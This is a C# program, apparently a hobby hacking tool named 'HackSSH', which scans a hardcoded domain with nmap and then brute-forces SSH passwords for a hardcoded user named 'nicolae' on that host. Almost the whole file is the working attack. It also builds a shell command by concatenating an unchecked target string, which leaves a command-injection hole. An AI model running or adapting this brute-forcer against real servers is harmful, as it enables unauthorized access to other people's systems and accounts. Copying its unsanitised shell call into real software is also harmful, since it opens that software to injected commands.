using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Renci.SshNet;
using System.Numerics;
using System.Linq;

namespace HackSSH
{
    public interface IActions
    {
        void Display(string text);
        string SendS1(string target);
        SSHData SendS2(string target, string user);
        List<PortData> GetPorts(string data);
    }
    public class Actions : IActions
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="target"></param>
        /// <returns></returns>
        public string SendS1(string target)
        {
            var command = "nmap " + target;
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {

                FileName = "cmd.exe",
                Arguments = $"/C {command}",
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                CreateNoWindow = true
            };
            string response;

            process.Start();
            process.WaitForExit();
            response = process.StandardOutput.ReadToEnd();

            var errorOutput = process.StandardError.ReadToEnd();
            if (errorOutput.Length != 0)
                Console.WriteLine(errorOutput);
            else Console.WriteLine(response);
            process.Close();
            return response;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="target"></param>
        /// <returns></returns>
        public SSHData SendS2(string target, string user)
        {
            var reponse = new SSHData { };
            var numbers = "0123456789";
            var upperLetters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var lowerLetters = upperLetters.ToLower();
            var all = upperLetters + numbers + lowerLetters;
            var str = all;
            var results = from e in Range(0, BigInteger.Pow(2, str.Length))
                          let p = from b in Enumerable.Range(1, str.Length)
                                  select (e & BigInteger.Pow(2, b - 1)) == 0 ? (char?)null : str[b - 1]
                          select string.Join(string.Empty, p);
            bool valid = false;
            SshClient CS = new SshClient(target, 22, "user", "pass");
            BigInteger index = 0;
            foreach (var pass in results.Cast<object>()
                .Select((r, i) => new { Value = r, Index = i })){
                if (pass.Value.ToString().Length >= 6)
                {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("\nIndex of string resulted is ");
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    Console.WriteLine(pass.Index);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("Index of string with length >= 6 is ");
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    Console.WriteLine(++index);
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    Console.ResetColor();
                    Console.WriteLine("Check for user=\"nicolae\" and password=\"" + pass.Value + "\"");

                    CS = new SshClient(target, 22, "nicolae", pass.Value.ToString());
                    try
                    {
                        CS.Connect();
                    }
                    catch (Exception Ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(Ex.Message);
                        Console.ResetColor();
                    }
                    bool IsConnected = CS.IsConnected;
                    if (IsConnected)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("Success!  The password are indentificated!");
                        reponse = new SSHData {
                            SSHUser = user,
                            SSHPasword = pass.Value.ToString(),
                            SSHTarget = target
                        };
                        Console.ResetColor();
                        break;
                    }
                }
            }
            CS.Disconnect();
            return reponse;
        }
        public static IEnumerable<BigInteger> Range(BigInteger start, BigInteger count)
        {
            while (count-- > 0)
            {
                yield return start++;
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="text"></param>
        public void Display(string text)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            var width = Console.WindowWidth;
            Console.Title = text;
            for (int i = 0; i < (width - text.Length) / 2; i++)
                Console.Write("-");
            Console.Write(text);
            for (int i = 0; i < (width - text.Length) / 2; i++)
                Console.Write("-");
            Console.WriteLine();
            Console.ResetColor();
        }

        public List<PortData> GetPorts(string data)
        {
            var lines = data.Split("\r\n");
            List<PortData> ports = new List<PortData>();

            foreach (var line in lines)
            {
                if (line.Length > 0)
                {

                    if (Char.IsDigit(line[0])) ports.Add(new PortData
                    {
                        Port = Convert.ToInt32(line.Split("/")[0]),
                        Status = line.Contains("open") ? "open" : "closed",
                        Name = line.Contains("open")
                                ? line.Split("open")[1].Trim() : line.Contains("closed")
                                ? line.Split("closed")[1].Trim() : ""
                    });
                }
            }
            return ports;
        }
    }
    class Start
    {
        public static void Init()
        {
            IActions _actions = new Actions();
            _actions.Display("Is Time to hacking");
            var target = "runfree.ml";
            var data = _actions.SendS1(target);
            var ports = _actions.GetPorts(data);
            _actions.Display("List of Ports");
            foreach (var port in ports)
            {
                Console.WriteLine(port.Port + " " + port.Status + " " + port.Name);
            }
            Console.Clear();
            _actions.Display("Start SSH");
            _actions.SendS2(target, "nicolae");

            while (Console.ReadLine() != "exit") { }
        }
    }
    public class PortData
    {
        public int Port { get; set; }
        public string Status { get; set; }
        public string Name { get; set; }
    }
    public class SSHData
    {
        public string SSHUser { get; set; }
        public string SSHPasword { get; set; }
        public string SSHTarget { get; set; }
    }
}
